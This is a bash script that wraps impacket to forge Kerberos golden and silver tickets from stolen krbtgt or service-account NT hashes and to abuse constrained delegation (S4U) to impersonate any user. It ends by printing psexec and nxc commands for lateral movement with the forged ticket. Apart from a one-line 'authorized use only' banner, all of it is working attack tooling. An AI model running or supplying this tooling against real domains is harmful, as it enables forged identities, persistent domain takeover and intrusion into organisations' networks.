#!/usr/bin/env bash
#
# tickets.sh - Kerberos ticket forging & S4U helper (impacket)
# -----------------------------------------------------------------------------
# Wraps the impacket ticket toolset for the classic post-DA / delegation moves:
#   golden  : forge a TGT from the krbtgt hash (full domain persistence).
#   silver  : forge a service ticket from a service account hash (targeted).
#   s4u     : abuse constrained delegation (getST -impersonate) to get a ticket
#             as any user to a delegated service.
# It builds the command, prints it, and runs it; the resulting .ccache is set
# in KRB5CCNAME instructions for immediate use.
# -----------------------------------------------------------------------------
# !!! HIGH-IMPACT. Golden/silver tickets = forged identities / domain
# persistence. AUTHORIZED USE ONLY - range / lab / scoped engagement. !!!
# -----------------------------------------------------------------------------
#
# USAGE:
#   ./tickets.sh golden -d <domain> -s <domain_sid> -k <krbtgt_nt> -u <user> [-i dc_ip]
#   ./tickets.sh silver -d <domain> -s <domain_sid> -k <service_nt> -u <user> \
#                       -t <target_fqdn> -p <spn_service>            # e.g. cifs
#   ./tickets.sh s4u    -d <domain> -i <dc_ip> -u <deleg_acct> (-P pass | -H :nt) \
#                       -m <impersonate_user> -p <spn>               # e.g. cifs/host
#
# DEPENDENCIES: impacket (ticketer, getST), and lookupsid to find the SID.
# -----------------------------------------------------------------------------

set -euo pipefail
c_info(){ printf '\033[1;34m[*]\033[0m %s\n' "$*"; }
c_ok(){   printf '\033[1;32m[+]\033[0m %s\n' "$*"; }
c_err(){  printf '\033[1;31m[-]\033[0m %s\n' "$*" >&2; }
c_step(){ printf '\n\033[1;36m===== %s =====\033[0m\n' "$*"; }
run(){ printf '\033[0;37m$ %s\033[0m\n' "$*"; "$@"; }
imp(){ command -v "$1.py" 2>/dev/null || command -v "impacket-$1" 2>/dev/null; }

MODE="${1:-}"; shift || true
DOMAIN="" SID="" KEY="" USER="" DC="" TARGET="" SPN="" PASS="" HASH="" IMP=""
usage(){ sed -n '2,30p' "$0"; exit 1; }
while getopts "d:s:k:u:i:t:p:H:m:P:h" o; do case "$o" in
  d) DOMAIN=$OPTARG;; s) SID=$OPTARG;; k) KEY=$OPTARG;; u) USER=$OPTARG;; i) DC=$OPTARG;;
  t) TARGET=$OPTARG;; p) SPN=$OPTARG;; H) HASH=$OPTARG;; m) IMP=$OPTARG;; P) PASS=$OPTARG;; *) usage;;
esac; done
case "$MODE" in golden|silver|s4u) :;; *) usage;; esac

TICKETER=$(imp ticketer); GETST=$(imp getST)

if [ "$MODE" = golden ]; then
  [ -z "$DOMAIN" ] || [ -z "$SID" ] || [ -z "$KEY" ] || [ -z "$USER" ] && { c_err "golden needs -d -s -k -u"; usage; }
  [ -z "$TICKETER" ] && { c_err "impacket-ticketer not found"; exit 1; }
  c_step "Forging GOLDEN ticket for '$USER'"
  run "$TICKETER" -nthash "$KEY" -domain-sid "$SID" -domain "$DOMAIN" "$USER"
  c_ok "Created $USER.ccache"
elif [ "$MODE" = silver ]; then
  [ -z "$DOMAIN" ] || [ -z "$SID" ] || [ -z "$KEY" ] || [ -z "$USER" ] || [ -z "$TARGET" ] || [ -z "$SPN" ] && { c_err "silver needs -d -s -k -u -t -p"; usage; }
  [ -z "$TICKETER" ] && { c_err "impacket-ticketer not found"; exit 1; }
  c_step "Forging SILVER ticket ($SPN/$TARGET) as '$USER'"
  run "$TICKETER" -nthash "$KEY" -domain-sid "$SID" -domain "$DOMAIN" -spn "$SPN/$TARGET" "$USER"
  c_ok "Created $USER.ccache"
elif [ "$MODE" = s4u ]; then
  [ -z "$DOMAIN" ] || [ -z "$DC" ] || [ -z "$USER" ] || [ -z "$IMP" ] || [ -z "$SPN" ] && { c_err "s4u needs -d -i -u -m -p"; usage; }
  [ -z "$GETST" ] && { c_err "impacket-getST not found"; exit 1; }
  c_step "S4U: impersonating '$IMP' to '$SPN' via delegated account '$USER'"
  A=( -spn "$SPN" -impersonate "$IMP" -dc-ip "$DC" "$DOMAIN/$USER" )
  [ -n "$HASH" ] && run "$GETST" -hashes "$HASH" "${A[@]}" || run "$GETST" -p "$PASS" "${A[@]}"
  c_ok "Created ${IMP}.ccache (or *.ccache in cwd)"
fi

c_info "Use the ticket:"
echo "   export KRB5CCNAME=$PWD/$(ls -t ./*.ccache 2>/dev/null | head -1 | xargs -n1 basename 2>/dev/null || echo '<user>.ccache')"
echo "   impacket-psexec -k -no-pass $DOMAIN/<user>@<target-fqdn>"
echo "   nxc smb <target> -k --use-kcache"
